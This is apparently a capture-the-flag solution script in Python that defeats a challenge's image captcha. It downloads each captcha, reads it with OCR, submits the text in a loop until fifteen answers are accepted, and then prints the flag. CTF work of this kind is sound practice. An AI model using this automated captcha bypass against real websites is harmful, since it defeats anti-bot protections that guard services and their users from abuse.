import requests
from PIL import Image
import pytesseract
from lxml import html


s = requests.Session()
url = 'http://challenges.owaspil.ctf.today:8088/'
captcha_url = 'http://challenges.owaspil.ctf.today:8088/captcha.php'
r = s.get(url, allow_redirects=False)
i=0
while i < 15:
    captcha = s.get(captcha_url, allow_redirects=False)
    with open('/tmp/captcha.png', 'wb') as c:
        c.write(captcha.content)
    text = pytesseract.image_to_string(Image.open('/tmp/captcha.png'))    
    r = s.post(url, data={'captcha': text, 'submit': ''})
    tree = html.fromstring(r.content)
    message = tree.xpath("/html/body/div/h4/text()")[0]
    if message == 'Correct!':
        i += 1
    if message == 'Congratulation!':
        print(tree.xpath("/html/body/div/p/text()")[0])
        break
    print(i, message)
